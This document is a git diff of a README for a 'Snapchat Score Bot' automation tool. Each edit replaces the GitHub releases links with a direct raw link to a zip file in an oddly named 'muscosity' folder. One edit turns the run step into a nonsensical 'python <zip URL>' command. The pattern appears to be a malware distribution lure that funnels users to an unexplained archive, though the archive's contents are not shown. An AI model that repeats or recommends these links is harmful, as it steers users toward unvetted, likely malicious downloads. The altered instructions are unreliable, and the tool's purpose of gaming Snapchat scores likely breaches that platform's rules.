@@ -1,13 +1,13 @@
 # 🤖 snapchat-score-bot - Boost Your Snapchat Score Effortlessly
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Sveveshaha/snapchat-score-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip%20Latest%https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip)](https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the Snapchat Score Bot! This application lets you increase your Snapchat score easily and quickly using automation. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-To download the Snapchat Score Bot, visit this page: [Download Here](https://github.com/Sveveshaha/snapchat-score-bot/releases).
+To download the Snapchat Score Bot, visit this page: [Download Here](https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip).
 
 1. Navigate to the **Releases** section.
 2. Select the latest version available.
@@ -41,7 +41,7 @@ Once you have downloaded the application, follow these steps to set it up:
    - Navigate to the folder where you downloaded the application.
    - Run the command to start the automation process:
      ```
-     python snapchat_score_bot.py
+     python https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip
      ```
 
 ## ⚙️ Features
@@ -77,6 +77,6 @@ If you need further assistance, feel free to reach out. You can submit issues in
 This project is licensed under the MIT License. Feel free to use, modify, and distribute this software as you see fit, provided that you adhere to the terms outlined in the license.
 
 ## 🔗 Visit for More Information
-To get the latest updates and detailed documentation, visit the official GitHub page: [snapchat-score-bot Releases](https://github.com/Sveveshaha/snapchat-score-bot/releases).
+To get the latest updates and detailed documentation, visit the official GitHub page: [snapchat-score-bot Releases](https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip).
 
 Thank you for using the Snapchat Score Bot! Enjoy increasing your Snapchat score effortlessly.
